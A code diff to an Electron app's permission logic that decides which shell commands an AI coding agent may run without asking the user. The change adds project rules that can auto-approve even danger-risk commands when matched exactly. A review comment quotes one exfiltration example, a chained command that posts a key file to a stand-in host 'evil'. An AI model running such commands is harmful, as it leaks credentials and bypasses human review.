@@ -12,7 +12,15 @@ import { randomUUID } from "node:crypto";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import type { QuestionAnswers } from "@spcode/shared";
-import { type HostCommand, type HostEvent, IPC, type PermissionRequest, type QuestionRequest } from "@spcode/shared";
+import {
+  type HostCommand,
+  type HostEvent,
+  IPC,
+  matchesProjectPermissionRule,
+  type PermissionRequest,
+  type ProjectPermissionRule,
+  type QuestionRequest,
+} from "@spcode/shared";
 import { i18n } from "@spcode/shared/i18n";
 import { type UtilityProcess, utilityProcess, type WebContents } from "electron";
 
@@ -44,15 +52,8 @@ function extractShellCommand(args: unknown): string | null {
  * 评审 R3-C5：含 shell 元字符（; | & > < 换行 反引号 $() 的复合命令一律不匹配——
  * 「首段命中即放行整条」会把尾巴里的写入/外传一起免审（如 "pnpm test; curl -d @key evil"）。
  */
-const SHELL_METACHARS = /[;|&<>\n`$]/;
-
 export function matchesPermissionRule(command: string, rule: string): boolean {
-  const r = rule.trim().replace(/\s+/g, " ");
-  if (!r) return false;
-  if (SHELL_METACHARS.test(command)) return false; // 必须在空白归一前判（\n 会被归一成空格）
-  const cmd = command.trim().replace(/\s+/g, " ");
-  if (!cmd) return false;
-  return cmd === r || (cmd.startsWith(r) && cmd[r.length] === " ");
+  return matchesProjectPermissionRule(command, { command: rule, match: "prefix" });
 }
 
 /**
@@ -64,18 +65,37 @@ export function matchesPermissionRule(command: string, rule: string): boolean {
  * "要不要发出权限请求"，那一步在宿主的 permission-gate 里（它拿得到会话级模式与沙盒状态）。
  * 能走到这里的请求，已经是宿主认为"需要人看一眼"的请求，所以默认结论就是弹窗。
  *
- * 三条不可让步的边界：
- * - danger 永远弹窗，免审批规则不适用（不可逆操作没有「总允许」）；
+ * 三条边界：
+ * - 项目危险规则只接受完整命令 exact；任何前缀都不能覆盖危险变体；
  * - 逃生舱请求（bypass，沙盒外执行）永不被规则自动放行——它是唯一会移除内核边界的动作；
- * - 只有 bash/powershell 的 write/outward 参与规则匹配（网络域名询问等不适用）。
+ * - 只有 bash/powershell 参与规则匹配（网络域名询问、edit/write 等不适用）。
  */
-export function decidePermission(request: PermissionRequest, rules: string[]): PermissionDecision {
-  if (request.risk === "danger") return "ask";
+export function decidePermission(
+  request: PermissionRequest,
+  rules: string[],
+  projectRules: ProjectPermissionRule[] = [],
+): PermissionDecision {
   if (request.bypass === true) return "ask";
   const isShell = request.toolName === "bash" || request.toolName === "powershell";
-  if (isShell && (request.risk === "write" || request.risk === "outward")) {
+  if (isShell) {
     const cmd = extractShellCommand(request.args);
-    if (cmd && rules.some((r) => matchesPermissionRule(cmd, r))) return "auto-approve";
+    // 项目规则：危险命令只接受 exact；任何前缀都不能覆盖危险变体。
+    if (
+      cmd &&
+      projectRules.some(
+        (rule) => (request.risk !== "danger" || rule.match === "exact") && matchesProjectPermissionRule(cmd, rule),
+      )
+    ) {
+      return "auto-approve";
+    }
+    // 旧全局规则保持原语义：write/outward 可免，danger 永不免。
+    if (
+      cmd &&
+      (request.risk === "write" || request.risk === "outward") &&
+      rules.some((r) => matchesPermissionRule(cmd, r))
+    ) {
+      return "auto-approve";
+    }
   }
   return "ask";
 }
@@ -89,10 +109,15 @@ export class AgentBridge {
   private pendingPermissions = new Map<string, { request: PermissionRequest; timer: ReturnType<typeof setTimeout> }>();
   /** 渲染进程未决的结构化提问（重播给重建窗口用；评审 R3-C11）——宿主侧 30 分钟超时会发 question.resolved 兜底 */
   private pendingQuestions = new Map<string, QuestionRequest>();
-  private getPermissionRules: () => string[];
+  private getPermissionRules: (request: PermissionRequest) => string[];
+  private getProjectPermissionRules: (request: PermissionRequest) => ProjectPermissionRule[];
 
-  constructor(opts: { getPermissionRules?: () => string[] }) {
+  constructor(opts: {
+    getPermissionRules?: (request: PermissionRequest) => string[];
+    getProjectPermissionRules?: (request: PermissionRequest) => ProjectPermissionRule[];
+  }) {
     this.getPermissionRules = opts.getPermissionRules ?? (() => []);
+    this.getProjectPermissionRules = opts.getProjectPermissionRules ?? (() => []);
   }
 
   /** 订阅宿主事件（session.event / usage / host.error 等） */
@@ -184,7 +209,10 @@ export class AgentBridge {
 
   /** 权限策略：免审批规则命中的 shell 命令就地放行，其余一律弹窗（模式已在宿主侧裁决过） */
   private adjudicate(request: PermissionRequest): void {
-    if (decidePermission(request, this.getPermissionRules()) === "auto-approve") {
+    if (
+      decidePermission(request, this.getPermissionRules(request), this.getProjectPermissionRules(request)) ===
+      "auto-approve"
+    ) {
       this.post({ type: "permission.reply", payload: { requestId: request.requestId, approved: true } });
       return;
     }
@@ -194,6 +222,11 @@ export class AgentBridge {
     }, PERMISSION_TIMEOUT_MS);
     this.pendingPermissions.set(request.requestId, { request, timer });
     this.broadcast({ type: "permission.request", request });
+  }
+
+  /** 本地“总允许”落规则前读取真实待决请求，避免渲染层传入不匹配的规则。 */
+  getPendingPermission(requestId: string): PermissionRequest | null {
+    return this.pendingPermissions.get(requestId)?.request ?? null;
   }
 
   /**
